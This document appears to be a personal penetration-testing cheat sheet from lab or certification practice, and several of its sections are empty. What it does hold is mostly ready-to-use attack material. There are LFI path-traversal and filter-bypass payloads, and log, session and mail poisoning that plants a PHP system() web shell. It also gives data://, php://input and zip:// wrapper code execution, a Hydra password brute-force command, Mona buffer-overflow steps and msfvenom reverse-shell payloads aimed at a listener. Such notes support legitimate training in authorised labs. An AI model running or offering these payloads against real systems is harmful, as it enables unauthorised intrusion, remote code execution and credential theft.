# I'm the BEST to ever DO IT
 ### GENERAL
 ##### Lemmie upgrade you
 ```bash
Upgrade $ /bin/sh to full /bin/bash shell
python -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
```
##### Samba Enumeration 
```bash
sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 
 ```
##### SSH w0nT C0nN3cT
```bash
-oKexAlgorithms=+diffie-hellman-group1-sha1
```
##### Hydra easy
```bash
hydra -l bethany -P /usr/share/wordlists/rockyou.txt -s 9505 -f 10.11.1.50 http-get /~login -V -I
```
##### WP easy
```bash
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
```
##### VPN Trouble shooting
```bash
sudo nano /etc/resolv.conf
sudo NetworkManager restart
```
##### SMBSUCKS Try this
```bash
smbclient //MOUNT/Yourmomma -I 192.168.154.55 -N
```
### SQLi 
```bash

```

### SQL General 
```bash

```

### LIF/RFI 
```bash
=/etc/passwd
LFI with Path Traversal
=../../../../../../../../../etc/passwd

Prefixing a / before the payload will bypass the filename and traverse directories instead.
=/../../../../../etc/passwd

LFI with Blacklisting
=....//....//....//....//....//....//....//....//etc/passwd

Bypass with URL Encoding
%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

Source Code Disclosure via PHP Wrappers config.php
=php://filter/read=convert.base64-encode/resource=config
echo 'PD9waHAKCiRjb2..." | base64 -d

Extension Bypass Using Null Byte
When it is adding .php on the end...get rid of it with a null byte >>> include("/etc/passwd%00.php")
/etc/passwd\x00
````
##### RCE through Apache / Nginx Log Files
````
=/var/log/apache2/access.log
Change the User-Agent header to test Log Posioning >>> BRUISER HAXXXXX
Now change it to <?php system($_GET['cmd']); ?>
=/var/log/apache2/access.log&cmd=whoami
````
##### RCE through PHP Session Files
````
This path is dictated by the session.save_path configuration variable, which is empty by default.
Linux: /var/lib/php/sessions/
Windows: C:\Windows\Temp
Identified from the PHPSESSID cookie >>> nhhv8i0o6ua4g88bkdl9u1fdsd
Location on disk would be /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
=session_poisoning
=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
=<?php system($_GET['cmd']); ?>
=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
````

##### Other PHP Wrappers
````
expect wrapper is disabled by default but can prove very useful if enabled
=expect://id

data wrapper can be used to include external data
Apache: /etc/php/X.Y/apache2/php.ini
php-fpm used by Nginx: /etc/php/X.Y/fpm/php.ini
echo '<?php system($_GET['cmd']); ?>' | base64
  PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id

input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled
The following curl command sends a POST request with a system command and then includes it using php://input, which gets executed by the page.
curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid

zip wrapper can prove useful in combination with file uploads
apt install phpX.Y-zip
Byron@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' > exec.php
Byron@htb[/htb]$ zip malicious.zip exec.php
Byron@htb[/htb]$ rm exec.php
copy malicious.zip to the webroot to simulate the upload. The files in the zip archive can be referenced using the # symbol
which should be URL-encoded in the request. For example, the URL below can be used to include exec.php and then execute code using the cmd parameter
=zip://malicious.zip%23exec.php&cmd=id
````
```bash
## LFI/RFI
Exploiting PHP File Inclusion – Overview
https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

Add %00 to test if the file is adding .php to the filename < before php version 5.3
Add ? to act as another parameter

include will execute the file. Others will not

## Local File inclusion
$file = $_GET['page'];
require($file);

check with files that generally can be accessed
/etc/passwd
/etc/hostname
/etc/hosts

read php file
php://filter/convert.base64-encode/resource=<file name/Path> e.g. index
echo "<output>" |base64 -d

.htaccess
config.php in web root folder?

root/user ssh keys? .bash_history?
/.ssh/id_rsa
/.ssh/id_rsa.keystore
/.ssh/id_rsa.pub
/.ssh/authorized_keys
/.ssh/known_hosts

php Wrapper  
expect://<command>  

page=php://input&cmd=ls  
in POST request  
<?php echo shell_exec($GET_['cmd']);?>  

Upload Zip shell file and extract with zip  
zip://path/to/file.zip%23shell  
zip://path/to/file.zip%23shell.php  

Check current running user  
/proc/self/status  
check uid and gid  

### Log Poisoning  
https://wiki.apache.org/httpd/DistrosDefaultLayout  
**Common log file location**  
**Ubuntu, Debian**  
/var/log/apache2/error.log  
/var/log/apache2/access.log  

**Red Hat, CentOS, Fedora, OEL, RHEL**  
/var/log/httpd/error_log  
/var/log/httpd/access_log  
  
**FreeBSD**  
/var/log/httpd-error.log  
/var/log/httpd-access.log  

**Common Config file location**  
check any restriction or hidden path on accessing the server  

**Ubuntu**  
/etc/apache2/apache2.conf  

/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  

**FreeBSD**  
/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  

proc/self/environ  
https://www.exploit-db.com/papers/12886/  
/proc/self/environ  

### SSH log posioning  
http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/  

### Mail log  
telnet <IP> 25  
EHLO <random character>  

VRFY <user>@localhost  

mail from:attacker@attack.com  
rcpt to: <user>@localhost  
data  

Subject: title  
<?php echo system($_REQUEST['cmd']); ?>  

<end with .>  

LFI /var/mail/<user>  

## Remote File Inclusion  
requires allow_url_fopen=On and allow_url_include=On  

$incfile = $_REQUEST["file"];  
include($incfile.".php");  
```

###  POWERSHELL
```bash

```

### MSFVENOM 
```bash

```

### BUFFER OVERFLOW 
```bash
!mona config -set workingfolder c:\mona\bruiser
!mona findmsp -distance 600
!mona bytearray -b "\x00"
!mona compare -f C:\mona\bruiser\bytearray.bin -a esp
!mona jmp -r esp -cpb "\x00"
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

MATCH YOUR PAYLOAD LANGUAGE WITH THE LANGUAGE OF THE PROGRAM RUNNING (WINDOWS IS PROBABLY RUNNING C)
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.41.12 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
```

### LINUX PRIVESC
```bash

```

### WINDOWS PRIVESC 
```bash

```

### Compile 
```bash
UBUNTU
sudo nano /etc/apt/sources.list
replace all the current us >>> old-releases
  example deb http://old-releases.ubuntu.com/ubuntu/
sudo apt-get update
sudo apt-get install gcc
*I installed some extra stuff*
sudo apt-get install libsctp-dev

sudo apt install default-libmysqlclient-dev default-libmysqld-dev
After you've finished compiling, run "file <compiled file name>". Is the file shown as a 32 bit or 64 bit binary? If it's still 64 bit even after using the -m32 flag you can try "sudo apt install gcc-multilib". Then run gcc -m32 -Wl,--hash-style=both -o outputfile inputfile.c 

```
